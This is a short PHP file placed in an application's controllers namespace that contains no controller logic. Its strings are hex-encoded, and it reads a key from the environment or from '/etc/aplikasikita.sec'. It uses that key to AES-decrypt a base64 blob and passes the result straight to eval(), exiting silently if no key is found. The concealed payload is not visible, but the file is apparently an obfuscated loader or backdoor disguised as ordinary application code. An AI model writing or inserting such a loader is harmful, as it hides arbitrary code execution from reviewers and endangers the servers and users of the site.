<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+zRv/VVLfSUE5XO6AYWb9A==');

$c=base64_decode(

'0h7vYOMvpT+8a7iIuBbb+DqaJwUXv2TF7KG+afdx3grcZ/rvNjouy7myj/9wS6bTYiyb07PAX/kj' .
'IFtk1yveHHRi+Krg+ZxA6733PMjDSq1WMMm28vH2QCDt2OyERW2kS35lSaFFdSsmmrJ8onGTLLrv' .
'tm9jCF9LxQx/fHz67PBQK3ZJ4JJCx95WRk760igvnBXv2uHfKdt0PbvNyzoCG53nzx+6Wsrm4n3C' .
'pwNflmV+MpJ0tiVnp41r7YPQ2Ah7HUIo4BJi2fU12WVOlCIkV9IEkst0ViR9adr0HpncMs8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

